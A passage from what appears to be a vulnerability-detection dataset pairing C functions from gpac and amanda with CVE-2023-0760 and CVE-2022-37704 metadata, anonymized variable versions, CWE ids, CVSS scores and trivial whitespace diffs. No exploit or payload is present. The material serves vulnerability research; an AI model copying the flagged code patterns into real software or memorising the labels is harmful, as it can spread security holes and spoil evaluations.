				if ((VAR_3<VAR_18) || (VAR_3>VAR_19)) {
					VAR_18 = VAR_19+1;
					continue;
				}
				/* COMMENT_1 */
				VAR_11 = VAR_9->sample_entries[VAR_10].group_description_index;
				break;
			}
		}
	}
#endif
	/* COMMENT_2 */
	if (!VAR_11) goto exit;

	VAR_12 = NULL;

	if (VAR_11<=0x10000) {
		for (VAR_10=0; VAR_10<gf_list_count(VAR_0->Media->information->sampleTable->sampleGroupsDescription); VAR_10++) {
			VAR_12 = (GF_SampleGroupDescriptionBox*)gf_list_get(VAR_0->Media->information->sampleTable->sampleGroupsDescription, VAR_10);
			if (VAR_12->grouping_type==VAR_9->grouping_type) break;
			VAR_12 = NULL;
		}
	}
#ifndef VAR_23
	else if (traf) {
		VAR_11 -= 0x10000;
		for (VAR_10=0; VAR_10<gf_list_count(traf->sampleGroupsDescription); VAR_10++) {
			VAR_12 = (GF_SampleGroupDescriptionBox*)gf_list_get(traf->sampleGroupsDescription, VAR_10);
			if (VAR_12->grouping_type==VAR_9->grouping_type) break;
			VAR_12 = NULL;
		}
	}
#endif
	/* COMMENT_3 */
	if (!VAR_12) return VAR_26;

	VAR_20 = (GF_CENCSampleEncryptionGroupEntry *) gf_list_get(VAR_12->group_descriptions, VAR_11 - 1);
	if (!VAR_20) return VAR_26;

	if (VAR_4) *VAR_4 = VAR_20->IsProtected;
	if (VAR_5) *VAR_5 = VAR_20->crypt_byte_block;
	if (VAR_6) *VAR_6 = VAR_20->skip_byte_block;

	if (VAR_7) *VAR_7 = VAR_20->key_info;
	if (VAR_8) *VAR_8 = VAR_20->key_info_size;

exit:
	/* COMMENT_4 */
	if (( (VAR_2 && VAR_2->piff_type==1) || (VAR_0->moov && VAR_0->moov->mov->is_smooth) ) && VAR_7 && ! (*VAR_7) ) {
		if (!VAR_2) {
			if (VAR_4) *VAR_4 = VAR_27;
			if (VAR_8) *VAR_8 = 8;
		} else {
			if (!VAR_2->piff_type) {
				VAR_2->piff_type = 2;
				VAR_2->IV_size = 8;
			}
			assert(VAR_2->IV_size);
			if (VAR_4) *VAR_4 = VAR_27;
			if (VAR_8) *VAR_8 = VAR_2->IV_size;
		}
	}

	return VAR_28;
}",,"--- func_before
+++ func_after
@@ -17,7 +17,7 @@
 	if (skip_byte_block) *skip_byte_block = 0;
 	if (key_info) *key_info = NULL;
 	if (key_info_size) *key_info_size = 0;
-	
+
 	if (!trak) return GF_BAD_PARAM;
 
 #ifdef	GPAC_DISABLE_ISOM_FRAGMENTS","{'deleted_lines': ['\t'], 'added_lines': ['']}",True,Heap-based Buffer Overflow in GitHub repository gpac/gpac prior to V2.1.0-DEV.,7.8,HIGH,2,valid,2023-02-08T15:52:00Z,4
CVE-2023-0760,['CWE-122'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H,1,gpac,sgpd box entry: disallow null grouping_type (#2389),ea7395f39f601a7750d48d606e9d10ea0b7beefe,https://github.com/gpac/gpac/commit/ea7395f39f601a7750d48d606e9d10ea0b7beefe,src/isomedia/isom_read.c,gf_isom_get_sample_for_media_time,"GF_EXPORT
GF_Err gf_isom_get_sample_for_media_time(GF_ISOFile *the_file, u32 trackNumber, u64 desiredTime, u32 *StreamDescriptionIndex, GF_ISOSearchMode SearchMode, GF_ISOSample **sample, u32 *SampleNum, u64 *data_offset)
{
GF_Err e;
u32 sampleNumber, prevSampleNumber, syncNum, shadowSync;
GF_TrackBox *trak;
GF_ISOSample *shadow;
GF_SampleTableBox *stbl;
Bool static_sample = GF_FALSE;
u8 useShadow, IsSync;
if (SampleNum) *SampleNum = 0;
trak = gf_isom_get_track_from_file(the_file, trackNumber);
if (!trak) return GF_BAD_PARAM;
stbl = trak->Media->information->sampleTable;
#ifndefGPAC_DISABLE_ISOM_FRAGMENTS
if (desiredTime < trak->dts_at_seg_start) {
desiredTime = 0;
} else {
desiredTime -= trak->dts_at_seg_start;
}
#endif
e = stbl_findEntryForTime(stbl, desiredTime, 0, &sampleNumber, &prevSampleNumber);
if (e) return e;
useShadow = 0;
if (!stbl->ShadowSync && (SearchMode == GF_ISOM_SEARCH_SYNC_SHADOW))
SearchMode = GF_ISOM_SEARCH_SYNC_BACKWARD;
if (! trak->Media->information->sampleTable->SyncSample) {
if (SearchMode == GF_ISOM_SEARCH_SYNC_FORWARD) SearchMode = GF_ISOM_SEARCH_FORWARD;
if (SearchMode == GF_ISOM_SEARCH_SYNC_BACKWARD) SearchMode = GF_ISOM_SEARCH_BACKWARD;
}
if (!sampleNumber && !prevSampleNumber) {
if (SearchMode == GF_ISOM_SEARCH_SYNC_BACKWARD || SearchMode == GF_ISOM_SEARCH_BACKWARD) {
sampleNumber = trak->Media->information->sampleTable->SampleSize->sampleCount;
}
if (!sampleNumber) return GF_EOS;
}
IsSync = 0;
switch (SearchMode) {
case GF_ISOM_SEARCH_SYNC_FORWARD:
IsSync = 1;
case GF_ISOM_SEARCH_FORWARD:
if (!sampleNumber) {
if (prevSampleNumber != stbl->SampleSize->sampleCount) {
sampleNumber = prevSampleNumber + 1;
} else {
sampleNumber = prevSampleNumber;
}
}
break;
case GF_ISOM_SEARCH_SYNC_BACKWARD:
IsSync = 1;
case GF_ISOM_SEARCH_SYNC_SHADOW:
case GF_ISOM_SEARCH_BACKWARD:
default:
if (!sampleNumber && !prevSampleNumber) {
sampleNumber = stbl->SampleSize->sampleCount;
} else if (!sampleNumber) {
sampleNumber = prevSampleNumber;
}
break;
}
if (IsSync) {
e = Media_FindSyncSample(trak->Media->information->sampleTable,
sampleNumber, &syncNum, SearchMode);
if (e) return e;
if (syncNum) sampleNumber = syncNum;
syncNum = 0;
}
else if (SearchMode == GF_ISOM_SEARCH_SYNC_SHADOW) {
e = Media_FindSyncSample(trak->Media->information->sampleTable,
sampleNumber, &syncNum, GF_ISOM_SEARCH_SYNC_BACKWARD);
if (e) return e;
}
if (sample) {
if (*sample) {
static_sample = GF_TRUE;
} else {
*sample = gf_isom_sample_new();
if (*sample == NULL) return GF_OUT_OF_MEM;
}
}
if (SearchMode == GF_ISOM_SEARCH_SYNC_SHADOW) {
stbl_GetSampleShadow(stbl->ShadowSync, &sampleNumber, &shadowSync);
if ((sampleNumber < syncNum) || (!shadowSync)) {
sampleNumber = syncNum;
} else {
useShadow = 1;
}
}
e = Media_GetSample(trak->Media, sampleNumber, sample, StreamDescriptionIndex, GF_FALSE, data_offset);
if (e) {
if (!static_sample)
gf_isom_sample_del(sample);
else if (! (*sample)->alloc_size && (*sample)->data && (*sample)->dataLength )
(*sample)->alloc_size =  (*sample)->dataLength;
return e;
}
if (sample && ! (*sample)->IsRAP) {
Bool is_rap;
GF_ISOSampleRollType roll_type;
e = gf_isom_get_sample_rap_roll_info(the_file, trackNumber, sampleNumber, &is_rap, &roll_type, NULL);
if (e) return e;
if (is_rap) (*sample)->IsRAP = SAP_TYPE_3;
}
if (SampleNum) {
*SampleNum = sampleNumber;
#ifndefGPAC_DISABLE_ISOM_FRAGMENTS
*SampleNum += trak->sample_count_at_seg_start;
#endif
}
if (sample && useShadow) {
shadow = gf_isom_get_sample(the_file, trackNumber, shadowSync, StreamDescriptionIndex);
if (!shadow) return GF_OK;
(*sample)->IsRAP = RAP;
gf_free((*sample)->data);
(*sample)->dataLength = shadow->dataLength;
(*sample)->data = shadow->data;
shadow->dataLength = 0;
gf_isom_sample_del(&shadow);
}
if (static_sample && ! (*sample)->alloc_size )
(*sample)->alloc_size =  (*sample)->dataLength;
return GF_OK;
}","GF_EXPORT
VAR_0 gf_isom_get_sample_for_media_time(GF_ISOFile *VAR_1, u32 VAR_2, u64 VAR_3, u32 *VAR_4, GF_ISOSearchMode VAR_5, GF_ISOSample **VAR_6, u32 *VAR_7, u64 *VAR_8)
{
GF_Err VAR_9;
u32 VAR_10, VAR_11, VAR_12, VAR_13;
GF_TrackBox *VAR_14;
GF_ISOSample *VAR_15;
GF_SampleTableBox *VAR_16;
Bool VAR_17 = VAR_18;
u8 VAR_19, VAR_20;
if (VAR_7) *VAR_7 = 0;
VAR_14 = gf_isom_get_track_from_file(VAR_1, VAR_2);
if (!VAR_14) return VAR_21;
VAR_16 = VAR_14->Media->information->sampleTable;
#ifndefVAR_22
if (VAR_3 < VAR_14->dts_at_seg_start) {
VAR_3 = 0;
} else {
VAR_3 -= VAR_14->dts_at_seg_start;
}
#endif
VAR_9 = stbl_findEntryForTime(VAR_16, VAR_3, 0, &VAR_10, &VAR_11);
if (VAR_9) return VAR_9;
VAR_19 = 0;
if (!VAR_16->ShadowSync && (VAR_5 == VAR_23))
VAR_5 = VAR_24;
if (! VAR_14->Media->information->sampleTable->SyncSample) {
if (VAR_5 == VAR_25) VAR_5 = VAR_26;
if (VAR_5 == VAR_24) VAR_5 = VAR_27;
}
if (!VAR_10 && !VAR_11) {
if (VAR_5 == VAR_24 || VAR_5 == VAR_27) {
VAR_10 = VAR_14->Media->information->sampleTable->SampleSize->sampleCount;
}
if (!VAR_10) return VAR_28;
}
VAR_20 = 0;
switch (VAR_5) {
case VAR_25:
VAR_20 = 1;
case VAR_26:
if (!VAR_10) {
if (VAR_11 != VAR_16->SampleSize->sampleCount) {
VAR_10 = VAR_11 + 1;
} else {
VAR_10 = VAR_11;
}
}
break;
case VAR_24:
VAR_20 = 1;
case VAR_23:
case VAR_27:
default:
if (!VAR_10 && !VAR_11) {
VAR_10 = VAR_16->SampleSize->sampleCount;
} else if (!VAR_10) {
VAR_10 = VAR_11;
}
break;
}
if (VAR_20) {
VAR_9 = Media_FindSyncSample(VAR_14->Media->information->sampleTable,
VAR_10, &VAR_12, VAR_5);
if (VAR_9) return VAR_9;
if (VAR_12) VAR_10 = VAR_12;
VAR_12 = 0;
}
else if (VAR_5 == VAR_23) {
VAR_9 = Media_FindSyncSample(VAR_14->Media->information->sampleTable,
VAR_10, &VAR_12, VAR_24);
if (VAR_9) return VAR_9;
}
if (VAR_6) {
if (*VAR_6) {
VAR_17 = VAR_29;
} else {
*VAR_6 = gf_isom_sample_new();
if (*VAR_6 == NULL) return VAR_30;
}
}
if (VAR_5 == VAR_23) {
stbl_GetSampleShadow(VAR_16->ShadowSync, &VAR_10, &VAR_13);
if ((VAR_10 < VAR_12) || (!VAR_13)) {
VAR_10 = VAR_12;
} else {
VAR_19 = 1;
}
}
VAR_9 = Media_GetSample(VAR_14->Media, VAR_10, VAR_6, VAR_4, VAR_18, VAR_8);
if (VAR_9) {
if (!VAR_17)
gf_isom_sample_del(VAR_6);
else if (! (*VAR_6)->alloc_size && (*VAR_6)->data && (*VAR_6)->dataLength )
(*VAR_6)->alloc_size =  (*VAR_6)->dataLength;
return VAR_9;
}
if (VAR_6 && ! (*VAR_6)->IsRAP) {
Bool VAR_31;
GF_ISOSampleRollType VAR_32;
VAR_9 = gf_isom_get_sample_rap_roll_info(VAR_1, VAR_2, VAR_10, &VAR_31, &VAR_32, NULL);
if (VAR_9) return VAR_9;
if (VAR_31) (*VAR_6)->IsRAP = VAR_33;
}
if (VAR_7) {
*VAR_7 = VAR_10;
#ifndefVAR_22
*VAR_7 += VAR_14->sample_count_at_seg_start;
#endif
}
if (VAR_6 && VAR_19) {
VAR_15 = gf_isom_get_sample(VAR_1, VAR_2, VAR_13, VAR_4);
if (!VAR_15) return VAR_34;
(*VAR_6)->IsRAP = VAR_35;
gf_free((*VAR_6)->data);
(*VAR_6)->dataLength = VAR_15->dataLength;
(*VAR_6)->data = VAR_15->data;
VAR_15->dataLength = 0;
gf_isom_sample_del(&VAR_15);
}
if (VAR_17 && ! (*VAR_6)->alloc_size )
(*VAR_6)->alloc_size =  (*VAR_6)->dataLength;
return VAR_34;
}",,"GF_EXPORT
GF_Err gf_isom_get_sample_for_media_time(GF_ISOFile *the_file, u32 trackNumber, u64 desiredTime, u32 *StreamDescriptionIndex, GF_ISOSearchMode SearchMode, GF_ISOSample **sample, u32 *SampleNum, u64 *data_offset)
{
	GF_Err e;
	u32 sampleNumber, prevSampleNumber, syncNum, shadowSync;
	GF_TrackBox *trak;
	GF_ISOSample *shadow;
	GF_SampleTableBox *stbl;
	Bool static_sample = GF_FALSE;
	u8 useShadow, IsSync;

	if (SampleNum) *SampleNum = 0;
	trak = gf_isom_get_track_from_file(the_file, trackNumber);
	if (!trak) return GF_BAD_PARAM;

	stbl = trak->Media->information->sampleTable;

#ifndef	GPAC_DISABLE_ISOM_FRAGMENTS
	if (desiredTime < trak->dts_at_seg_start) {
		desiredTime = 0;
	} else {
		desiredTime -= trak->dts_at_seg_start;
	}
#endif

	e = stbl_findEntryForTime(stbl, desiredTime, 0, &sampleNumber, &prevSampleNumber);
	if (e) return e;

	//if no shadow table, reset to sync only
	useShadow = 0;
	if (!stbl->ShadowSync && (SearchMode == GF_ISOM_SEARCH_SYNC_SHADOW))
		SearchMode = GF_ISOM_SEARCH_SYNC_BACKWARD;

	//if no syncTable, disable syncSearching, as all samples ARE sync
	if (! trak->Media->information->sampleTable->SyncSample) {
		if (SearchMode == GF_ISOM_SEARCH_SYNC_FORWARD) SearchMode = GF_ISOM_SEARCH_FORWARD;
		if (SearchMode == GF_ISOM_SEARCH_SYNC_BACKWARD) SearchMode = GF_ISOM_SEARCH_BACKWARD;
	}

	//not found, return EOF or browse backward
	if (!sampleNumber && !prevSampleNumber) {
		if (SearchMode == GF_ISOM_SEARCH_SYNC_BACKWARD || SearchMode == GF_ISOM_SEARCH_BACKWARD) {
			sampleNumber = trak->Media->information->sampleTable->SampleSize->sampleCount;
		}
		if (!sampleNumber) return GF_EOS;
	}

	//check in case we have the perfect sample
	IsSync = 0;

	//according to the direction adjust the sampleNum value
	switch (SearchMode) {
	case GF_ISOM_SEARCH_SYNC_FORWARD:
		IsSync = 1;
	case GF_ISOM_SEARCH_FORWARD:
		//not the exact one
		if (!sampleNumber) {
			if (prevSampleNumber != stbl->SampleSize->sampleCount) {
				sampleNumber = prevSampleNumber + 1;
			} else {
				sampleNumber = prevSampleNumber;
			}
		}
		break;

	//if dummy mode, reset to default browsing
	case GF_ISOM_SEARCH_SYNC_BACKWARD:
		IsSync = 1;
	case GF_ISOM_SEARCH_SYNC_SHADOW:
	case GF_ISOM_SEARCH_BACKWARD:
	default:
		//first case, not found....
		if (!sampleNumber && !prevSampleNumber) {
			sampleNumber = stbl->SampleSize->sampleCount;
		} else if (!sampleNumber) {
			sampleNumber = prevSampleNumber;
		}
		break;
	}

	//get the sync sample num
	if (IsSync) {
		//get the SyncNumber
		e = Media_FindSyncSample(trak->Media->information->sampleTable,
		                         sampleNumber, &syncNum, SearchMode);
		if (e) return e;
		if (syncNum) sampleNumber = syncNum;
		syncNum = 0;
	}
	//if we are in shadow mode, get the previous sync sample
	//in case we can't find a good SyncShadow
	else if (SearchMode == GF_ISOM_SEARCH_SYNC_SHADOW) {
		//get the SyncNumber
		e = Media_FindSyncSample(trak->Media->information->sampleTable,
		                         sampleNumber, &syncNum, GF_ISOM_SEARCH_SYNC_BACKWARD);
		if (e) return e;
	}


	//OK sampleNumber is exactly the sample we need (except for shadow)

	if (sample) {
		if (*sample) {
			static_sample = GF_TRUE;
		} else {
			*sample = gf_isom_sample_new();
			if (*sample == NULL) return GF_OUT_OF_MEM;
		}
	}
	//we are in shadow mode, we need to browse both SyncSample and ShadowSyncSample to get
	//the desired sample...
	if (SearchMode == GF_ISOM_SEARCH_SYNC_SHADOW) {
		//get the shadowing number
		stbl_GetSampleShadow(stbl->ShadowSync, &sampleNumber, &shadowSync);
		//now sampleNumber is the closest previous shadowed sample.
		//1- If we have a closer sync sample, use it.
		//2- if the shadowSync is 0, we don't have any shadowing, use syncNum
		if ((sampleNumber < syncNum) || (!shadowSync)) {
			sampleNumber = syncNum;
		} else {
			//otherwise, we have a better alternate sample in the shadowSync for this sample
			useShadow = 1;
		}
	}

	e = Media_GetSample(trak->Media, sampleNumber, sample, StreamDescriptionIndex, GF_FALSE, data_offset);
	if (e) {
		if (!static_sample)
			gf_isom_sample_del(sample);
		else if (! (*sample)->alloc_size && (*sample)->data && (*sample)->dataLength )
		 	(*sample)->alloc_size =  (*sample)->dataLength;

		return e;
	}
	if (sample && ! (*sample)->IsRAP) {
		Bool is_rap;
		GF_ISOSampleRollType roll_type;
		e = gf_isom_get_sample_rap_roll_info(the_file, trackNumber, sampleNumber, &is_rap, &roll_type, NULL);
		if (e) return e;
		if (is_rap) (*sample)->IsRAP = SAP_TYPE_3;
	}
	//optionally get the sample number
	if (SampleNum) {
		*SampleNum = sampleNumber;
#ifndef	GPAC_DISABLE_ISOM_FRAGMENTS
		*SampleNum += trak->sample_count_at_seg_start;
#endif
	}

	//in shadow mode, we only get the data of the shadowing sample !
	if (sample && useShadow) {
		//we have to use StreamDescriptionIndex in case the sample data is in another desc
		//though this is unlikely as non optimized...
		shadow = gf_isom_get_sample(the_file, trackNumber, shadowSync, StreamDescriptionIndex);
		//if no sample, the shadowSync is broken, return the sample
		if (!shadow) return GF_OK;
		(*sample)->IsRAP = RAP;
		gf_free((*sample)->data);
		(*sample)->dataLength = shadow->dataLength;
		(*sample)->data = shadow->data;
		//set data length to 0 to keep the buffer alive...
		shadow->dataLength = 0;
		gf_isom_sample_del(&shadow);
	}
	if (static_sample && ! (*sample)->alloc_size )
		 (*sample)->alloc_size =  (*sample)->dataLength;

	return GF_OK;
}","GF_EXPORT
VAR_0 gf_isom_get_sample_for_media_time(GF_ISOFile *VAR_1, u32 VAR_2, u64 VAR_3, u32 *VAR_4, GF_ISOSearchMode VAR_5, GF_ISOSample **VAR_6, u32 *VAR_7, u64 *VAR_8)
{
	GF_Err VAR_9;
	u32 VAR_10, VAR_11, VAR_12, VAR_13;
	GF_TrackBox *VAR_14;
	GF_ISOSample *VAR_15;
	GF_SampleTableBox *VAR_16;
	Bool VAR_17 = VAR_18;
	u8 VAR_19, VAR_20;

	if (VAR_7) *VAR_7 = 0;
	VAR_14 = gf_isom_get_track_from_file(VAR_1, VAR_2);
	if (!VAR_14) return VAR_21;

	VAR_16 = VAR_14->Media->information->sampleTable;

#ifndef	VAR_22
	if (VAR_3 < VAR_14->dts_at_seg_start) {
		VAR_3 = 0;
	} else {
		VAR_3 -= VAR_14->dts_at_seg_start;
	}
#endif

	VAR_9 = stbl_findEntryForTime(VAR_16, VAR_3, 0, &VAR_10, &VAR_11);
	if (VAR_9) return VAR_9;

	/* COMMENT_0 */
	VAR_19 = 0;
	if (!VAR_16->ShadowSync && (VAR_5 == VAR_23))
		VAR_5 = VAR_24;

	/* COMMENT_1 */
	if (! VAR_14->Media->information->sampleTable->SyncSample) {
		if (VAR_5 == VAR_25) VAR_5 = VAR_26;
		if (VAR_5 == VAR_24) VAR_5 = VAR_27;
	}

	/* COMMENT_2 */
	if (!VAR_10 && !VAR_11) {
		if (VAR_5 == VAR_24 || VAR_5 == VAR_27) {
			VAR_10 = VAR_14->Media->information->sampleTable->SampleSize->sampleCount;
		}
		if (!VAR_10) return VAR_28;
	}

	/* COMMENT_3 */
	VAR_20 = 0;

	/* COMMENT_4 */
	switch (VAR_5) {
	case VAR_25:
		VAR_20 = 1;
	case VAR_26:
		/* COMMENT_5 */
		if (!VAR_10) {
			if (VAR_11 != VAR_16->SampleSize->sampleCount) {
				VAR_10 = VAR_11 + 1;
			} else {
				VAR_10 = VAR_11;
			}
		}
		break;

	/* COMMENT_6 */
	case VAR_24:
		VAR_20 = 1;
	case VAR_23:
	case VAR_27:
	default:
		/* COMMENT_7 */
		if (!VAR_10 && !VAR_11) {
			VAR_10 = VAR_16->SampleSize->sampleCount;
		} else if (!VAR_10) {
			VAR_10 = VAR_11;
		}
		break;
	}

	/* COMMENT_8 */
	if (VAR_20) {
		/* COMMENT_9 */
		VAR_9 = Media_FindSyncSample(VAR_14->Media->information->sampleTable,
		                         VAR_10, &VAR_12, VAR_5);
		if (VAR_9) return VAR_9;
		if (VAR_12) VAR_10 = VAR_12;
		VAR_12 = 0;
	}
	/* COMMENT_10 */
	/* COMMENT_11 */
	else if (VAR_5 == VAR_23) {
		/* COMMENT_9 */
		VAR_9 = Media_FindSyncSample(VAR_14->Media->information->sampleTable,
		                         VAR_10, &VAR_12, VAR_24);
		if (VAR_9) return VAR_9;
	}


	/* COMMENT_12 */

	if (VAR_6) {
		if (*VAR_6) {
			VAR_17 = VAR_29;
		} else {
			*VAR_6 = gf_isom_sample_new();
			if (*VAR_6 == NULL) return VAR_30;
		}
	}
	/* COMMENT_13 */
	/* COMMENT_14 */
	if (VAR_5 == VAR_23) {
		/* COMMENT_15 */
		stbl_GetSampleShadow(VAR_16->ShadowSync, &VAR_10, &VAR_13);
		/* COMMENT_16 */
		/* COMMENT_17 */
		/* COMMENT_18 */
		if ((VAR_10 < VAR_12) || (!VAR_13)) {
			VAR_10 = VAR_12;
		} else {
			/* COMMENT_19 */
			VAR_19 = 1;
		}
	}

	VAR_9 = Media_GetSample(VAR_14->Media, VAR_10, VAR_6, VAR_4, VAR_18, VAR_8);
	if (VAR_9) {
		if (!VAR_17)
			gf_isom_sample_del(VAR_6);
		else if (! (*VAR_6)->alloc_size && (*VAR_6)->data && (*VAR_6)->dataLength )
		 	(*VAR_6)->alloc_size =  (*VAR_6)->dataLength;

		return VAR_9;
	}
	if (VAR_6 && ! (*VAR_6)->IsRAP) {
		Bool VAR_31;
		GF_ISOSampleRollType VAR_32;
		VAR_9 = gf_isom_get_sample_rap_roll_info(VAR_1, VAR_2, VAR_10, &VAR_31, &VAR_32, NULL);
		if (VAR_9) return VAR_9;
		if (VAR_31) (*VAR_6)->IsRAP = VAR_33;
	}
	/* COMMENT_20 */
	if (VAR_7) {
		*VAR_7 = VAR_10;
#ifndef	VAR_22
		*VAR_7 += VAR_14->sample_count_at_seg_start;
#endif
	}

	/* COMMENT_21 */
	if (VAR_6 && VAR_19) {
		/* COMMENT_22 */
		/* COMMENT_23 */
		VAR_15 = gf_isom_get_sample(VAR_1, VAR_2, VAR_13, VAR_4);
		/* COMMENT_24 */
		if (!VAR_15) return VAR_34;
		(*VAR_6)->IsRAP = VAR_35;
		gf_free((*VAR_6)->data);
		(*VAR_6)->dataLength = VAR_15->dataLength;
		(*VAR_6)->data = VAR_15->data;
		/* COMMENT_25 */
		VAR_15->dataLength = 0;
		gf_isom_sample_del(&VAR_15);
	}
	if (VAR_17 && ! (*VAR_6)->alloc_size )
		 (*VAR_6)->alloc_size =  (*VAR_6)->dataLength;

	return VAR_34;
}",,"--- func_before
+++ func_after
@@ -164,6 +164,6 @@
 	}
 	if (static_sample && ! (*sample)->alloc_size )
 		 (*sample)->alloc_size =  (*sample)->dataLength;
-		 
+
 	return GF_OK;
 }","{'deleted_lines': ['\t\t '], 'added_lines': ['']}",True,Heap-based Buffer Overflow in GitHub repository gpac/gpac prior to V2.1.0-DEV.,7.8,HIGH,2,valid,2023-02-08T15:52:00Z,4
CVE-2023-0760,['CWE-122'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H,1,gpac,sgpd box entry: disallow null grouping_type (#2389),ea7395f39f601a7750d48d606e9d10ea0b7beefe,https://github.com/gpac/gpac/commit/ea7395f39f601a7750d48d606e9d10ea0b7beefe,src/isomedia/isom_read.c,gf_isom_get_track_switch_parameter,"GF_EXPORT
const u32 *gf_isom_get_track_switch_parameter(GF_ISOFile *movie, u32 trackNumber, u32 group_index, u32 *switchGroupID, u32 *criteriaListSize)
{
GF_TrackBox *trak;
GF_UserDataMap *map;
GF_TrackSelectionBox *tsel;
trak = gf_isom_get_track_from_file(movie, trackNumber);
if (!group_index || !trak || !trak->udta) return NULL;
map = udta_getEntry(trak->udta, GF_ISOM_BOX_TYPE_TSEL, NULL);
if (!map) return NULL;
tsel = (GF_TrackSelectionBox*)gf_list_get(map->boxes, group_index-1);
if (!tsel) return NULL;
*switchGroupID = tsel->switchGroup;
*criteriaListSize = tsel->attributeListCount;
return (const u32 *) tsel->attributeList;
}","GF_EXPORT
const VAR_0 *gf_isom_get_track_switch_parameter(GF_ISOFile *VAR_1, u32 VAR_2, u32 VAR_3, u32 *VAR_4, u32 *VAR_5)
{
GF_TrackBox *VAR_6;
GF_UserDataMap *VAR_7;
GF_TrackSelectionBox *VAR_8;
VAR_6 = gf_isom_get_track_from_file(VAR_1, VAR_2);
if (!VAR_3 || !VAR_6 || !VAR_6->udta) return NULL;
VAR_7 = udta_getEntry(VAR_6->udta, VAR_9, NULL);
if (!VAR_7) return NULL;
VAR_8 = (GF_TrackSelectionBox*)gf_list_get(VAR_7->boxes, VAR_3-1);
if (!VAR_8) return NULL;
*VAR_4 = VAR_8->switchGroup;
*VAR_5 = VAR_8->attributeListCount;
return (const u32 *) VAR_8->attributeList;
}",,"GF_EXPORT
const u32 *gf_isom_get_track_switch_parameter(GF_ISOFile *movie, u32 trackNumber, u32 group_index, u32 *switchGroupID, u32 *criteriaListSize)
{
	GF_TrackBox *trak;
	GF_UserDataMap *map;
	GF_TrackSelectionBox *tsel;

	trak = gf_isom_get_track_from_file(movie, trackNumber);
	if (!group_index || !trak || !trak->udta) return NULL;

	map = udta_getEntry(trak->udta, GF_ISOM_BOX_TYPE_TSEL, NULL);
	if (!map) return NULL;
	tsel = (GF_TrackSelectionBox*)gf_list_get(map->boxes, group_index-1);
	if (!tsel) return NULL;

	*switchGroupID = tsel->switchGroup;
	*criteriaListSize = tsel->attributeListCount;
	return (const u32 *) tsel->attributeList;
}","GF_EXPORT
const VAR_0 *gf_isom_get_track_switch_parameter(GF_ISOFile *VAR_1, u32 VAR_2, u32 VAR_3, u32 *VAR_4, u32 *VAR_5)
{
	GF_TrackBox *VAR_6;
	GF_UserDataMap *VAR_7;
	GF_TrackSelectionBox *VAR_8;

	VAR_6 = gf_isom_get_track_from_file(VAR_1, VAR_2);
	if (!VAR_3 || !VAR_6 || !VAR_6->udta) return NULL;

	VAR_7 = udta_getEntry(VAR_6->udta, VAR_9, NULL);
	if (!VAR_7) return NULL;
	VAR_8 = (GF_TrackSelectionBox*)gf_list_get(VAR_7->boxes, VAR_3-1);
	if (!VAR_8) return NULL;

	*VAR_4 = VAR_8->switchGroup;
	*VAR_5 = VAR_8->attributeListCount;
	return (const u32 *) VAR_8->attributeList;
}",,"--- func_before
+++ func_after
@@ -12,7 +12,7 @@
 	if (!map) return NULL;
 	tsel = (GF_TrackSelectionBox*)gf_list_get(map->boxes, group_index-1);
 	if (!tsel) return NULL;
-	
+
 	*switchGroupID = tsel->switchGroup;
 	*criteriaListSize = tsel->attributeListCount;
 	return (const u32 *) tsel->attributeList;","{'deleted_lines': ['\t'], 'added_lines': ['']}",True,Heap-based Buffer Overflow in GitHub repository gpac/gpac prior to V2.1.0-DEV.,7.8,HIGH,2,valid,2023-02-08T15:52:00Z,4
CVE-2022-37704,['CWE-77'],CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H,1,zmanda/amanda,CVE-2022-37704 - privilege escaltion form amandabackup user to root -fix,e890d08e16ea0621966a7ae35cce53ccb44a472e,https://github.com/zmanda/amanda/commit/e890d08e16ea0621966a7ae35cce53ccb44a472e,client-src/rundump.c,main,"int
main(
intargc,
char **argv)
{
#ifndef ERRMSG
char *dump_program;
int i;
char *e;
char *cmdline;
GPtrArray *array = g_ptr_array_new();
gchar **strings;
char  **env;
#endif 
glib_init();
if (argc > 1 && argv[1] && g_str_equal(argv[1], ""--version"")) {
printf(""rundump-%s\n"", VERSION);
return (0);
}
setlocale(LC_MESSAGES, ""C"");
textdomain(""amanda""); 
safe_fd(-1, 0);
safe_cd();
set_pname(""rundump"");
signal(SIGPIPE, SIG_IGN);
dbopen(DBG_SUBDIR_CLIENT);
config_init(CONFIG_INIT_CLIENT|CONFIG_INIT_GLOBAL, NULL);
if (argc < 3) {
error(_(""Need at least 3 arguments\n""));
}
dbprintf(_(""version %s\n""), VERSION);
#ifdef ERRMSG
g_fprintf(stderr, ERRMSG);
dbprintf(""%s: %s"", argv[0], ERRMSG);
dbclose();
return 1;
#else
#ifdef WANT_SETUID_CLIENT
check_running_as(RUNNING_AS_CLIENT_LOGIN | RUNNING_AS_UID_ONLY);
if (!become_root()) {
error(_(""error [%s could not become root (is the setuid bit set?)]\n""), get_pname());
}
#else
check_running_as(RUNNING_AS_CLIENT_LOGIN);
#endif
argc--;
argv++;
dbprintf(_(""config: %s\n""), argv[0]);
if (!g_str_equal(argv[0], ""NOCONFIG""))
dbrename(argv[0], DBG_SUBDIR_CLIENT);
argc--;
argv++;
#ifdef XFSDUMP
if (g_str_equal(argv[0], ""xfsdump""))
dump_program = XFSDUMP;
else 
#endif
#ifdef VXDUMP
if (g_str_equal(argv[0], ""vxdump""))
dump_program = VXDUMP;
else 
#endif
#ifdef VDUMP
if (g_str_equal(argv[0], ""vdump""))
dump_program = VDUMP;
else 
#endif
#if defined(DUMP)
dump_program = DUMP;
#else
# if defined(XFSDUMP)
dump_program = XFSDUMP;
# else
#  if defined(VXDUMP)
dump_program = VXDUMP;
#  else
dump_program = ""dump"";
#  endif
# endif
#endif
g_ptr_array_add(array, g_strdup(dump_program));
for (i = 1; argv[i]; i++)
g_ptr_array_add(array, quote_string(argv[i]));
g_ptr_array_add(array, NULL);
strings = (gchar **)g_ptr_array_free(array, FALSE);
cmdline = g_strjoinv("" "", strings);
g_strfreev(strings);
dbprintf(_(""running: %s\n""), cmdline);
amfree(cmdline);
env = safe_env();
execve(dump_program, argv, env);
free_env(env);
e = strerror(errno);
dbprintf(_(""failed (%s)\n""), e);
dbclose();
g_fprintf(stderr, _(""rundump: could not exec %s: %s\n""), dump_program, e);
return 1;
#endif
}","int
main(
intVAR_0,
char **VAR_1)
{
#ifndef VAR_2
char *VAR_3;
int VAR_4;
char *VAR_5;
char *VAR_6;
